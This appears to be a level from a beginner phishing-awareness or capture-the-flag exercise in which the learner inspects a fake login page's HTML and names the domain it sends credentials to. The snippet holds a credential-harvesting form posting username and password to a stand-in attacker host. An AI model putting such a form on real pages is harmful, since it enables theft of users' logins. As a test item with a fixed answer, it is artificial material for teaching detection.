# Level 08 — Phishing Page Clues

You found a fake login page.

Inspect the HTML snippet below.
Look at where the login form sends the credentials.

---

## HTML snippet

```html
<form action="http://fake-login.ru/steal" method="POST">
  <input name="user" />
  <input name="pass" type="password" />
  <button>Login</button>
</form>
```

---

## Question

What is the suspicious domain name?

---

## What to submit

Submit the domain name exactly as written.